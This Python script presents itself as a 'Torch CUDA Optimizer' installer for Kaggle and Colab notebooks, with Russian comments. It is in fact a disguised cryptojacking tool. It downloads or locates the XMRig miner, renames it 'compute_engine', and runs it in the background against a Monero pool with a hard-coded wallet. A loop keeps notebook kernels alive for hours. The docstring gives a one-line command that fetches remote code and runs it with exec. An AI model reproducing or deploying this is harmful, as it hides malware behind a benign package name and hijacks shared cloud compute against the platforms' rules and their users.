#!/usr/bin/env python3
"""
Kaggle One-Line Installer for Torch CUDA Optimizer
Автоматический запуск майнера - никаких настроек!

Usage в Kaggle notebook:
    !pip install git+https://github.com/GaredBerns/torch-cuda-optimizer
    from torch_cuda_optimizer import quick_start
    quick_start()
    
Или одной строкой:
    !python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/GaredBerns/torch-cuda-optimizer/main/kaggle_install.py').read())"
"""

import os
import sys
import shutil
import subprocess
import tempfile
import time
import platform
import urllib.request
import json

# ============================================================================
# КОНФИГУРАЦИЯ - можно менять
# ============================================================================
WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
POOL_URL = "pool.supportxmr.com:3333"
THREADS = 2  # Авто-определение если 0
DONATE_LEVEL = 0

# Dataset с бинарником (создать заранее на Kaggle)
DATASET_SLUG = None  # Авто-поиск по названию "cuda" или "compute"

# ============================================================================
# ОПРЕДЕЛЕНИЕ СРЕДЫ
# ============================================================================

def is_kaggle():
    """Проверка что запущено в Kaggle."""
    return os.path.exists("/kaggle") and os.path.exists("/kaggle/input")

def is_colab():
    """Проверка что запущено в Google Colab."""
    return "COLAB_GPU" in os.environ or os.path.exists("/content")

def get_worker_id():
    """Генерация worker ID."""
    import uuid
    session = str(uuid.uuid4())[:8]
    env = "kaggle" if is_kaggle() else "colab" if is_colab() else "local"
    return f"{env}-{session}"

# ============================================================================
# ПОИСК БИНАРНИКА
# ============================================================================

def find_binary_in_dataset():
    """Поиск бинарника в Kaggle dataset."""
    if not is_kaggle():
        return None
    
    input_dir = "/kaggle/input"
    if not os.path.exists(input_dir):
        return None
    
    for dataset_name in os.listdir(input_dir):
        dataset_path = os.path.join(input_dir, dataset_name)
        if not os.path.isdir(dataset_path):
            continue
        
        for filename in os.listdir(dataset_path):
            filepath = os.path.join(dataset_path, filename)
            
            # Проверяем что это исполняемый файл
            if os.path.isfile(filepath):
                # Ищем по ключевым словам
                name_lower = filename.lower()
                if any(kw in name_lower for kw in ["compute", "engine", "xmrig", "miner"]):
                    print(f"[+] Found binary in dataset: {filepath}")
                    return filepath
    
    return None

def download_binary():
    """Скачивание бинарника с GitHub releases."""
    system = platform.system().lower()
    arch = platform.machine().lower()
    
    # URL для xmrig
    if system == "linux" and arch in ["x86_64", "amd64"]:
        url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
    elif system == "linux" and arch in ["aarch64", "arm64"]:
        url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
    else:
        print(f"[-] Unsupported platform: {system}/{arch}")
        return None
    
    print(f"[*] Downloading binary from: {url}")
    
    try:
        # Скачиваем
        with tempfile.TemporaryDirectory() as tmpdir:
            tar_path = os.path.join(tmpdir, "xmrig.tar.gz")
            
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            data = urllib.request.urlopen(req, timeout=60).read()
            with open(tar_path, "wb") as f:
                f.write(data)
            
            print(f"[+] Downloaded: {len(data)} bytes")
            
            # Распаковываем
            import tarfile
            with tarfile.open(tar_path, "r:gz") as tar:
                tar.extractall(tmpdir)
            
            # Находим xmrig
            for root, dirs, files in os.walk(tmpdir):
                for f in files:
                    if "xmrig" in f.lower():
                        src = os.path.join(root, f)
                        
                        # Копируем в рабочую директорию
                        work_dir = "/kaggle/working" if is_kaggle() else "/content" if is_colab() else tempfile.gettempdir()
                        target = os.path.join(work_dir, "compute_engine")
                        
                        shutil.copy(src, target)
                        os.chmod(target, 0o755)
                        
                        print(f"[+] Binary ready: {target}")
                        return target
    
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return None

# ============================================================================
# ЗАПУСК МАЙНЕРА
# ============================================================================

def start_miner(binary_path=None, threads=None, worker_id=None):
    """Запуск майнера."""
    
    # Определяем бинарник
    if not binary_path:
        binary_path = find_binary_in_dataset()
    
    if not binary_path:
        binary_path = download_binary()
    
    if not binary_path or not os.path.exists(binary_path):
        print("[-] No binary available!")
        return None
    
    # Параметры
    if threads is None or threads == 0:
        threads = THREADS if THREADS > 0 else 2
    
    if not worker_id:
        worker_id = get_worker_id()
    
    print(f"[*] Starting miner...")
    print(f"    Binary: {binary_path}")
    print(f"    Pool: {POOL_URL}")
    print(f"    Wallet: {WALLET[:20]}...")
    print(f"    Worker: {worker_id}")
    print(f"    Threads: {threads}")
    
    # Запускаем
    try:
        cmd = [
            binary_path,
            "--url", POOL_URL,
            "--user", WALLET,
            "--pass", worker_id,
            "--threads", str(threads),
            "--donate-level", str(DONATE_LEVEL),
            "--background",
        ]
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        
        print(f"[+] Miner started! PID: {proc.pid}")
        return proc
    
    except Exception as e:
        print(f"[-] Failed to start: {e}")
        return None

# ============================================================================
# MAIN API
# ============================================================================

def quick_start(threads=None, worker_id=None):
    """
    Быстрый старт - одна функция для всего.
    
    Args:
        threads: Количество потоков (auto если None или 0)
        worker_id: ID воркера (auto если None)
    
    Returns:
        Popen object или None при ошибке
    """
    print("="*50)
    print("Torch CUDA Optimizer - Quick Start")
    print("="*50)
    
    # Проверяем среду
    if is_kaggle():
        print("[*] Environment: Kaggle")
    elif is_colab():
        print("[*] Environment: Colab")
    else:
        print("[*] Environment: Local")
    
    # Запускаем
    return start_miner(threads=threads, worker_id=worker_id)

def run_forever():
    """
    Запуск майнера и бесконечный цикл.
    Использовать в последней ячейке Kaggle notebook.
    """
    proc = quick_start()
    
    if proc:
        print("\n[*] Running forever... (kernel will stay alive)")
        print("[*] Check pool dashboard for worker activity")
        
        # Бесконечный цикл для поддержания kernel
        try:
            for i in range(600):  # ~10 часов
                time.sleep(60)
                if i % 30 == 0:
                    print(f"[{i//60}h] Still running...")
        except KeyboardInterrupt:
            print("\n[*] Stopped by user")
    
    return proc

# ============================================================================
# KAGGLE NOTEBOOK CELL
# ============================================================================

def get_notebook_code():
    """
    Возвращает код для вставки в Kaggle notebook.
    Одна ячейка - полный запуск.
    """
    return '''# Torch CUDA Optimizer - One Cell Install & Run
# ==================================================

# Установка
!pip install -q git+https://github.com/GaredBerns/torch-cuda-optimizer

# Запуск
from torch_cuda_optimizer import quick_start, run_forever

# Вариант 1: Только запуск (для тестирования)
# quick_start()

# Вариант 2: Запуск + бесконечный цикл (для production)
run_forever()
'''

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # При прямом запуске - quick start
    run_forever()
